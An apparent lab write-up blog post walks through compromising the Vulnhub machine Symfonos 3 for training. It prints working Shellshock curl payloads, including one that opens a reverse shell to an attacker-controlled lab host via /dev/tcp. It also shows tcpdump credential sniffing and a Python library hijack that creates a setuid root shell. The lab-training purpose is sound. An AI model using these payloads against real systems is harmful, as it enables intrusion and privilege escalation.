<!doctype html><html lang=en><head><title>Vulnhub: Symfonos 3 ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/symfonos3/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/symfonos1/symfonos1.png"><meta name=twitter:title content="Vulnhub: Symfonos 3"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Symfonos 3"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/symfonos3/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-02-11 00:00:00 +0000 UTC"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/symfonos3/>Vulnhub: Symfonos 3</a></h1><div class=post-meta><time class=post-date>2021-02-11 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/intermediate/>Intermediate</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ffuf/>ffuf</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/directory-bruteforce/>Directory Bruteforce</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/shellshock/>ShellShock</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/tcpdump/>Tcpdump</a>&nbsp;</span><div class=post-content><div><img src=/img/symfonos1/symfonos1.png alt=symfonos class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Intermediate</td><td>7 Apr 2020</td><td>Zayotic</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
cron job. We create a suid bash binary that we use to get a root shell.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><pre tabindex=0><code class=language-nmap data-lang=nmap>Nmap scan report for 192.168.191.130
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=http-80>HTTP (80)<a href=#http-80 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Visiting the IP on the browser, all we get is a picture.</p><img src=/img/symfonos3/symfonos3-11.png alt=symfonos class=center style=border-radius:8px><p>Viewing the source doesn&rsquo;t reveal much.</p><img src=/img/symfonos3/symfonos3-12.png alt=symfonos class=center style=border-radius:8px><p>Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-3.png alt=symfonos class=center style=border-radius:8px><p>Going to the research endpoint, there&rsquo;s information about the Underworld and Greek mythology.</p><img src=/img/symfonos3/symfonos3-4.png alt=symfonos class=center style=border-radius:8px><p>Some of the words look similar to the directories we discovered, so let&rsquo;s create a wordlist which maybe helpful later.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
</span></span></code></pre></div><p>The current directories we have discovered don&rsquo;t have much in them. At this point I was stuck a bit, after looking at
some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
with a trailing slash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-5.png alt=symfonos class=center style=border-radius:8px><p>With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&rsquo;ll use going forward. The presence of
cgi-bin could potentially mean we can have a shellshock vulnerability.</p><p>Running another bruteforce using the wordlist I created earlier didn&rsquo;t work. I then thought to get a lowercase version of the
words and try it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-13.png alt=symfonos class=center style=border-radius:8px><p>With the lowercase wordlist, we get underworld.</p><p>To verify the shellshock vulnerability, we can send this request.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>curl -A <span style=color:#e6db74>&#34;() { :; }; echo; echo; /bin/bash -c &#39;cat /etc/passwd&#39;&#34;</span> http://192.168.191.130/cgi-bin/underworld
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-6.png alt=symfonos class=center style=border-radius:8px><h1 id=shell-as-cerberus>Shell as cerberus<a href=#shell-as-cerberus class=hanchor arialabel=Anchor>&#8983;</a></h1><p>After verifying this vulnerability, we can get a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>curl -A <span style=color:#e6db74>&#34;() { :; }; echo; echo; /bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.191.1/9000 0&gt;&amp;1 &amp;&#39;&#34;</span> http://192.168.191.130/cgi-bin/underworld
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-7.png alt=symfonos class=center style=border-radius:8px><p>On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find / -group pcap -ls 2&gt;/dev/null
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-8.png alt=symfonos class=center style=border-radius:8px><p>This reveals we can run tcpdump, therefore we can sniff network traffic.</p><p>Before sniffing traffic, I used <a href=https://github.com/DominicBreuker/pspy target=_blank rel=noopener>pspy</a>
to check for cron jobs and other commands being executed.</p><img src=/img/symfonos3/symfonos3-9.png alt=symfonos class=center style=border-radius:8px><p>With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&rsquo;ll sniff ftp
traffic which isn&rsquo;t typically encrypted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>tcpdump port <span style=color:#ae81ff>21</span> -n -i lo -A
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-10.png alt=symfonos class=center style=border-radius:8px><p>From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.</p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Using the credentials we login to ssh as hades, running id reveals hades is in gods group.</p><img src=/img/symfonos3/symfonos3-14.png alt=symfonos class=center style=border-radius:8px><p>Running find again reveals we have write permissions to /usr/lib/python2.7 folder.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find / -group gods -ls 2&gt;/dev/null
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-15.png alt=symfonos class=center style=border-radius:8px><p>Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
any imports in that ftpclient.py script.</p><img src=/img/symfonos3/symfonos3-16.png alt=symfonos class=center style=border-radius:8px><p>Since ftplib is imported, we&rsquo;ll replace ftplib.py with this script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;cp /bin/bash /tmp/bash&#39;</span>)
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;chmod +s /tmp/bash&#39;</span>)
</span></span></code></pre></div><img src=/img/symfonos3/symfonos3-17.png alt=symfonos class=center style=border-radius:8px><p>This will create a setuid bash binary in /tmp. Which can use to gain root privileges.</p><img src=/img/symfonos3/symfonos3-18.png alt=symfonos class=center style=border-radius:8px></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/symfonos4/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Symfonos 4</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/symfonos2/><span class=button__text>Vulnhub: Symfonos 2</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>